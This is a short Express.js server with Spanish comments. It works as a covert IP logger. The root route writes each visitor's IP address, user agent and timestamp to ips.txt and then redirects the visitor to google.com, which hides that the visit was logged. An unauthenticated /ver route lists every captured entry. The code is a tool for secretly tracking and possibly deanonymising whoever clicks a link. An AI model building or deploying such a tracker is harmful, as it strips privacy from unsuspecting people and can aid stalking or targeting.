const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();

app.use(express.json());

// Ruta principal: Captura la IP
app.get("/", (req, res) => {
    try {
        const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
        const userAgent = req.headers["user-agent"];
        const data = `IP: ${ip} - User-Agent: ${userAgent} - Fecha: ${new Date().toISOString()}\n`;

        const filePath = path.join(__dirname, "ips.txt");
        fs.appendFileSync(filePath, data);

        console.log("IP capturada:", ip);

        res.redirect("https://www.google.com"); // Redirección después de capturar la IP
    } catch (error) {
        console.error("Error capturando IP:", error);
        res.status(500).send("Error interno del servidor");
    }
});

// Ruta para ver las IPs capturadas
app.get("/ver", (req, res) => {
    try {
        const filePath = path.join(__dirname, "ips.txt");

        if (!fs.existsSync(filePath)) {
            return res.send("<pre>No hay IPs registradas.</pre>");
        }

        const ips = fs.readFileSync(filePath, "utf-8");
        res.send(`<pre>${ips}</pre>`);
    } catch (error) {
        console.error("Error mostrando IPs:", error);
        res.status(500).send("Error interno del servidor");
    }
});

// Puerto de ejecución
const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Servidor corriendo en el puerto ${port}`));
